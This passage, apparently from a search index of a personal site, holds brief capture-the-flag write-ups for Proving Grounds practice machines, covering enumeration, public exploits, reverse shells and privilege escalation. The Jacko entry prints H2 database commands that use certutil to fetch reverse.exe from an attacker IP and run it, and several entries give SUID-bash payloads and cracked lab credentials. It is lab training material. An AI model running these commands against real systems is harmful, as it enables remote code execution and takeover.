<p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"roquefort/#privilege-escalation","title":"Privilege Escalation","text":"<p>Transfer <code>linpeas</code>.</p> <p></p> <p></p> <p></p> <p></p> <p>We can write to <code>/usr/local/bin</code> so we can create a <code>run-parts</code> file that will be executed as <code>root</code>.</p> <p> </p> <p>We wait and...</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"roquefort/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"scrutiny/","title":"Scrutiny \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"scrutiny/#enumeration","title":"Enumeration","text":"<p>The web page is <code>onlyrands</code>, add to <code>/etc/hosts</code>.</p> <p></p> <p></p> <p>At <code>/login</code> we have:</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"scrutiny/#initial-access","title":"Initial Access","text":"<p>Searching for an exploit, we have https://github.com/Chocapikk/CVE-2024-27198.</p> <p></p> <p>We can use that credential to access the UI and explore, and we find an <code>id_rsa</code> under the Marco Tillman project.</p> <p></p> <p>The key is protected, so using <code>ssh2john</code> and <code>john</code> we get <code>cheer</code> as password.</p> <p></p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"scrutiny/#privilege-escalation","title":"Privilege Escalation","text":"<p>This user has email, so let's check <code>/var/spool/email</code>.</p> <p></p> <p>We have the <code>matthew</code> password.</p> <p></p> <p></p> <p>Pivot to <code>briand</code> and <code>sudo -l</code>.</p> <p></p> <p>Searching, we find https://sploitus.com/exploit?id=EDB-ID:51674, all <code>systemd</code> before <code>247</code> can be abused to gain root.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"scrutiny/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"snookums/","title":"Snookums \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"snookums/#enumeration","title":"Enumeration","text":"<p>The web server shows a simple PHP photo gallery <code>0.8</code>.</p> <p></p> <p>We find https://www.exploit-db.com/exploits/48424 that says there is a remote file inclusion.</p> <p></p> <p>So we can try a PHP reverse shell.</p> <p>Bug</p> <p>Reverse shell is not connecting back, I won't lose more time on this.</p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"sorcerer/","title":"Sorcerer \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"sorcerer/#enumeration","title":"Enumeration","text":"<p>The web server shows a 404 not found. Let's try <code>feroxbuster</code>.</p> <p>Port <code>7742</code> shows a login form, but it is not working; the front always shows invalid login.</p> <p></p> <p></p> <p><code>feroxbuster</code> finds a <code>zipfiles</code> path.</p> <p></p> <p>We find an <code>id_rsa</code> key in Max's zip.</p> <p></p> <p>We also find a Tomcat password.</p> <p></p> <p>A wrapper prevents SSH access, only <code>scp</code>.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"sorcerer/#initial-access","title":"Initial Access","text":"<p>The authorized keys use this wrapper, so we can remove it and <code>scp</code> it to replace it, and connect with SSH normally.</p> <p></p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"sorcerer/#privilege-escalation","title":"Privilege Escalation","text":"<p>Get the flag.</p> <p></p> <p></p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"sorcerer/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"spx/","title":"Spx \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"spx/#enumeration","title":"Enumeration","text":"<p>We have a <code>tiny file manager</code> login page.</p> <p></p> <p>None of the default credentials work. Using <code>feroxbuster</code>, we have a <code>phpinfo</code>.</p> <p></p> <p>Looking at the <code>phpinfo</code>, we see <code>spx</code>.</p> <p></p> <p>Searching the web, we find an issue for a path traversal: https://github.com/NoiseByNorthwest/php-spx/issues/251</p> <p></p> <p>So using <code>caido</code>, we can use the <code>spx</code> key filtered by <code>phpinfo</code> and...</p> <p></p> <p>Looking at the <code>tinyfilemanager</code> repository, we find that the users are hardcoded in the index.</p> <p></p> <p>So we go to the index and...</p> <p></p> <pre><code>$auth_users = array(\n    'admin' =&gt; '$2y$10$7LaMUa8an8NrvnQsj5xZ3eDdOejgLyXE8IIvsC.hFy1dg7rPb9cqG',\n    'user' =&gt; '$2y$10$x8PS6i0Sji2Pglyz7SLFruYFpAsz9XAYsdiPyfse6QDkB/QsdShxi'\n);\n</code></pre> <p>Using <code>hashcat</code>:</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"spx/#initial-access","title":"Initial Access","text":"<p>Now we can access the file manager and upload a reverse shell.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"spx/#privilege-escalation","title":"Privilege Escalation","text":"<p>We can pivot to the <code>profiler</code> user using the <code>lowprofile</code> password from before.</p> <p></p> <p>Get the flag.</p> <p></p> <p>We can use <code>make</code> with <code>sudo</code>.</p> <p></p> <p>Create a <code>Makefile</code>:</p> <pre><code>install:\n    chmod +s /bin/bash\n</code></pre> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"spx/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"sybaris/","title":"Sybaris \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"sybaris/#enumeration","title":"Enumeration","text":"<p>The web server has a PHP blog.</p> <p></p> <p></p> <p>The blog is made with <code>htmly</code> and Pablo.</p> <p></p> <p><code>ftp</code> shows an exit pub folder.</p> <p>Using <code>redis-cli</code>, we can connect; it is open.</p> <p>We can upload a Redis module to execute system commands. Upload it to the <code>ftp</code> server and load it with <code>redis</code>.</p> <p>https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html#load-redis-module https://github.com/n0b0dyCN/RedisModules-ExecuteCommand#</p> <p></p> <p></p> <p>Load the module from the default public <code>vftpd</code>.</p> <p></p> <p>Execute a reverse shell.</p> <p></p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"sybaris/#privilege-escalation","title":"Privilege Escalation","text":"<p>Searching for passwords in the blog project, we find Pablo's.</p> <p></p> <p>It is better to connect via <code>ssh</code>.</p> <p>Transfer <code>linpeas</code>.</p> <p></p> <p></p> <p>Compile a shared object with malicious code and put it in <code>/usr/local/lib/dev</code> and wait.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"sybaris/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"vmdak/","title":"Vmdak \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"vmdak/#enumeration","title":"Enumeration","text":"<p><code>ftp</code> has anonymous access with a Jenkins file.</p> <p></p> <p>Web server shows a prison management system.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"vmdak/#initial-access","title":"Initial Access","text":"<p>Searching for an exploit, we have an SQL injection.</p> <p></p> <p></p> <p></p> <p>Inside, there is a user with a password:</p> <p></p> <p><code>malcom:RonnyCache001</code></p> <p>And the admin credentials.</p> <p></p> <p>Now we can upload a PHP reverse shell using the avatar uploader, bypassing the jpg extension like <code>.jpg.php</code>.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"vmdak/#privilege-escalation","title":"Privilege Escalation","text":"<p>We see that there is a user we can pivot to: <code>vmdak</code>.</p> <p></p> <p>Let's try the password from <code>malcom</code>.</p> <p></p> <p>Get the flag.</p> <p></p> <p>We can connect via <code>ssh</code> with <code>vmdak</code> and stabilize the shell with <code>python</code> to have a fully interactive shell.</p> <p></p> <p>Prison web has SQL credentials.</p> <p></p> <p><code>sqlCr3ds3xp0seD</code></p> <p>We have Jenkins at port <code>8080</code> and MySQL at <code>3306</code>.</p> <p>In the <code>3306</code> database, we have <code>malcom</code> data.</p> <p></p> <p>For Jenkins, transfer <code>chisel</code> to the target and make a port forward.</p> <p></p> <p></p> <p>Jenkins is protected with a password.</p> <p></p> <p>Searching Jenkins exploits, we find an LFI.</p> <p></p> <p>Run the script with the path for Jenkins.</p> <p></p> <p>Now we can enter.</p> <p></p> <p>Create a job that puts the SUID bit on <code>/bin/bash</code>.</p> <p></p> <p>Build.</p> <p></p> <p>Let's check.</p> <p></p> <p>So:</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"vmdak/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"walla/","title":"Walla \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"walla/#enumeration","title":"Enumeration","text":"<p>Going to webserver port <code>8091</code>, we are greeted with a user and password login. Using <code>feroxbuster</code>, we find <code>package.json</code>.</p> <p></p> <p>If we follow the GitHub link, we can see the default user and password in the installation guide.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"walla/#initial-access","title":"Initial Access","text":"<p>We can enter with these credentials.</p> <p></p> <p>Going to System, we have a console.</p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"walla/#privilege-escalation","title":"Privilege Escalation","text":"<p>We can execute a Python script <code>wifi_reset.py</code>.</p> <p></p> <p></p> <p>When executing the script, it can't find the <code>wificontroller</code> module, so we can make one.</p> <p></p> <p>Now if we execute it, <code>/bin/bash</code> will have the SUID bit.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"walla/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"wombo/","title":"Wombo \ud83d\udd39","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"wombo/#enumeration","title":"Enumeration","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"wombo/#initial-access","title":"Initial Access","text":"<p>Use <code>redis</code> rogue server: https://github.com/n0b0dyCN/redis-rogue-server.git</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"wombo/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"xposedapi/","title":"Xposedapi \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"xposedapi/#enumeration","title":"Enumeration","text":"<p>Port shows a web page with instructions for an API.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"xposedapi/#initial-access","title":"Initial Access","text":"<p><code>/logs</code> has a WAF, so we can make requests from another host. By using the header <code>X-Forwarded-For</code>, we can bypass it.</p> <p></p> <p>We see the user <code>clumsyadmin</code>; this user can be used in the <code>/update</code> endpoint.</p> <p>Generate a reverse shell with <code>msfvenom</code> and start a listener.</p> <p></p> <p>Then set a listener and restart the app with <code>POST /restart</code>.</p> <p></p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"xposedapi/#privilege-escalation","title":"Privilege Escalation","text":"<p>Search for SUID programs.</p> <p></p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"xposedapi/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"zenphoto/","title":"Zenphoto \ud83d\udd38","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"zenphoto/#enumeration","title":"Enumeration","text":"<p>The webpage is under construction.</p> <p></p> <p>We find a <code>test</code> folder with <code>feroxbuster</code>.</p> <p></p> <p>And the <code>robots.txt</code>.</p> <p></p> <p>The test root is the gallery.</p> <p></p> <p>And we have admin access.</p> <p></p> <p>If we look at the source code, we get the version.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"zenphoto/#initial-access","title":"Initial Access","text":"<p>Fixing the PHP script.</p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"zenphoto/#privilege-escalation","title":"Privilege Escalation","text":"<p>Get a more stable shell with <code>python</code>.</p> <p></p> <p>Transfer <code>linpeas</code>.</p> <p></p> <p>Using <code>rds</code> one:</p> <p>https://www.exploit-db.com/exploits/15285</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"zenphoto/#post-exploitation","title":"Post Exploitation","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"zipper/","title":"Zipper \ud83d\udd3a","text":"","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"zipper/#enumeration","title":"Enumeration","text":"<p>The web is an app that zips all files you upload.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"zipper/#initial-access","title":"Initial Access","text":"<p>We can see an LFI by clicking on home, and using a PHP filter we can see PHP code.</p> <p></p> <p></p> <p>The filter is removing the last extension.</p> <p>We can upload a reverse shell to be zipped and then execute it by abusing zip slip without the extension.</p> <p></p> <p></p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"zipper/#privilege-escalation","title":"Privilege Escalation","text":"<p>There is a backup script with logs in <code>/opt</code>, read the logs.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"zipper/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udc27 Linux","\u2694\ufe0f Proving Grounds","Proving Grounds","Linux"]},{"location":"algernon/","title":"Algernon \ud83d\udd39","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"algernon/#enumeration","title":"Enumeration","text":"<p>In the <code>ftp</code> there are log files, download them all.</p> <p> </p> <p>So unknown port <code>5040</code> could be <code>smartermail</code>.</p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"algernon/#initial-access","title":"Initial Access","text":"<p>Searching for an exploit.</p> <p></p> <p>Editing hosts and ports.</p> <p> </p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"algernon/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"authby/","title":"Authby \ud83d\udd38","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"authby/#enumeration","title":"Enumeration","text":"<p>Enumerating the <code>ftp</code>, we can log in as <code>anonymous</code>.</p> <p> </p> <p>We can notice <code>offsec</code>, <code>anonymous</code>, and <code>admin</code> that can be users.</p> <p>We try to re-login with <code>admin:admin</code> and it works.</p> <p> </p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"authby/#initial-access","title":"Initial Access","text":"<p>We have credentials for port <code>242</code>.</p> <p>Using <code>john</code>...</p> <p></p> <p>We can write to that <code>ftp</code> folder, so now we can upload a reverse shell and...</p> <p> </p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"authby/#privilege-escalation","title":"Privilege Escalation","text":"<p>Get the flag.</p> <p></p> <p>We have <code>SeImpersonatePrivilege</code>.</p> <p></p> <p>But this is an old machine x86 and we need <code>juicy potato x86</code> and a correct <code>CLSID</code>.</p> <p>https://github.com/ivanitlearning/Juicy-Potato-x86</p> <p>https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise</p> <p>So transfer <code>potato</code> and a reverse shell with <code>msfvenom x86</code>.</p> <p> </p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"authby/#post-exploitation","title":"Post Exploitation","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"authby/#another-privilege-escalation-intended","title":"Another Privilege Escalation (intended)","text":"<p>This is a very old machine, search for a privilege escalation exploit.</p> <p></p> <p>Compile it, transfer it, and execute it.</p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"billyboss/","title":"Billyboss \ud83d\udd38","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"billyboss/#enumeration","title":"Enumeration","text":"<p>Port <code>80</code> has a <code>baget</code> instance.</p> <p></p> <p>Port <code>8081</code> has a <code>nexus repository manager</code>.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"billyboss/#initial-access","title":"Initial Access","text":"<p>Using <code>nexus:nexus</code>, we are in.</p> <p> </p> <p>Now executing the exploit (and changing the IP and cmd inside).</p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"billyboss/#privilege-escalation","title":"Privilege Escalation","text":"<p>We have <code>SeImpersonatePrivilege</code> but I can't get potatos to work, <code>whoami</code> doesn't work, not valid for proof.</p> <p>So we get all updates and notice one that is installed by <code>nathan</code>.</p> <p> </p> <p>We can use this exploit: https://github.com/danigargu/CVE-2020-0796</p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"billyboss/#post-exploitation","title":"Post Exploitation","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"craft/","title":"Craft \ud83d\udd38","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"craft/#enumeration","title":"Enumeration","text":"<p>We have a template page at port <code>80</code>.</p> <p></p> <p>There is an uploader that only accepts <code>.odt</code> files.</p> <p></p> <p></p> <p>CMS is made with <code>umbraco</code>.</p> <p>If we upload an <code>.odt</code> file, the file disappears in seconds. This is a phishing lab, it seems.</p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"craft/#initial-access","title":"Initial Access","text":"<p>Using this malicious ODT generator, we can craft an <code>.odt</code> with a macro to connect back on open.</p> <p>https://github.com/0bfxgh0st/MMG-LO</p> <p></p> <p>Start a listener and wait.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"craft/#privilege-escalation","title":"Privilege Escalation","text":"<p>Now we can put the PHP reverse shell manually in the uploads folder to pivot to the <code>apache</code> user.</p> <p></p> <p></p> <p>Start a listener, click it, and we have a shell as <code>apache</code>.</p> <p></p> <p></p> <p>We can impersonate, so transfer <code>printspoofer</code> and get a root shell.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"craft/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"dvr4/","title":"Dvr4 \ud83d\udd38","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"dvr4/#enumeration","title":"Enumeration","text":"<p>Web page at port <code>8080</code> shows an <code>Argus Surveillance</code> web.</p> <p></p> <p>There is a path traversal vulnerability.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"dvr4/#initial-access","title":"Initial Access","text":"<p>We have two users; we can try <code>id_rsa</code> keys.</p> <p> </p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"dvr4/#privilege-escalation","title":"Privilege Escalation","text":"<p>Searching for <code>argus</code> vulns, we see the weak password encryption.</p> <p></p> <p>So we get the administrator hash.</p> <p> </p> <p>We have <code>14WatchD0g</code> and <code>ImWatchingY0u</code>.</p> <p>The last character is missing, and looking at the code it says...</p> <p></p> <p>So we can try all special characters.</p> <p> </p> <p>Now try <code>psexec</code>.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"dvr4/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"hepet/","title":"Hepet \ud83d\udd38","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"hepet/#enumeration","title":"Enumeration","text":"<p><code>ftp</code> has anonymous access.</p> <p></p> <p>The webpage shows some users; a description is odd.</p> <p></p> <p>We can try to read messages with <code>pop3</code>.</p> <p> </p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"hepet/#initial-access","title":"Initial Access","text":"<p>So we can send a malicious OpenOffice document as <code>mailadmin</code>. We can use https://github.com/0bfxgh0st/MMG-LO.git to generate it and <code>sendEmail</code> to send it.</p> <p> </p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"hepet/#privilege-escalation","title":"Privilege Escalation","text":"<p>Transfer <code>winpeas</code>.</p> <p> </p> <p>We can hijack the binary.</p> <p> </p> <p>Restarting the service doesn't work, so restart the machine.</p> <p> </p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"hepet/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"internal/","title":"Internal \ud83d\udd39","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"internal/#enumeration","title":"Enumeration","text":"<p>This system is very old, so we can try to use <code>nse</code> with <code>smb</code>.</p> <p></p> <p>Using <code>searchsploit</code>.</p> <p></p> <p>Bug</p> <p>Nothing, can't seem to get it to work without metasploit.</p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"jacko/","title":"Jacko \ud83d\udd38","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"jacko/#enumeration","title":"Enumeration","text":"<p>Web server is an <code>H2</code> Java database welcome page.</p> <p></p> <p>At port <code>8082</code> we have the console.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"jacko/#initial-access","title":"Initial Access","text":"<p>We can access by clicking on connect.</p> <p>Then we can execute arbitrary commands as seen in https://www.exploit-db.com/exploits/49384.</p> <p>Once all commands are executed, we can upload a reverse shell and execute it.</p> <pre><code>CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"certutil -urlcache -split -f http://192.168.45.220/reverse.exe C:\\\\users\\\\tony\\\\reverse.exe\").getInputStream()).useDelimiter(\"\\\\Z\").next()');\nCALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"C:\\\\users\\\\tony\\\\reverse.exe\").getInputStream()).useDelimiter(\"\\\\Z\").next()');\n</code></pre> <p></p> <p>We have a restricted user, so reconstruct the path:</p> <pre><code>set PATH=%PATH%;C:\\Windows\\System32;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;\n</code></pre> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"jacko/#privilege-escalation","title":"Privilege Escalation","text":"<p>Transfer <code>winpeas</code>.</p> <p>We find a <code>Paperstream IP</code> program that seems out of the ordinary.</p> <p>Searching for exploit.</p> <p></p> <p>Generate the reverse shell DLL and transfer them to the host.</p> <p>Bug</p> <p>It doesn't work with PaperStream method or abusing SeImpersonatePrivilege method (juicypotato, godpotato, printspoofer...)</p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"kevin/","title":"Kevin \ud83d\udd39","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"kevin/#enumeration","title":"Enumeration","text":"<p>The web server at port <code>80</code> welcomes us with a login form. Trying <code>admin:admin</code> hits the jackpot.</p> <p> </p> <p>This is an <code>HP Power Manager 4.2 (Build 7)</code>.</p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"kevin/#initial-access","title":"Initial Access","text":"<p>Use this exploit: https://github.com/Muhammd/HP-Power-Manager/blob/master/hpm_exploit.py</p> <p>Execute it with the machine IP.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"kevin/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"medjed/","title":"Medjed \ud83d\udd38","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"medjed/#enumeration","title":"Enumeration","text":"<p>Port <code>33033</code> has a simple page with a login form.</p> <p> </p> <p>We have a <code>barracuda</code> service at port <code>8000</code>.</p> <p></p> <p>Set the account.</p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"medjed/#initial-access","title":"Initial Access","text":"<p>Using <code>cadaver</code>, we can use <code>webdav</code> with the account and upload a PHP reverse shell to <code>xampp\\htdocs</code>.</p> <p> </p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"medjed/#privilege-escalation","title":"Privilege Escalation","text":"<p><code>winpeas</code> found <code>jerren</code> password.</p> <p> </p> <p>We can write the exe of an autorun app, so replace it with a shell and restart.</p> <p> </p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"medjed/#post-exploitation","title":"Post Exploitation","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"mice/","title":"Mice 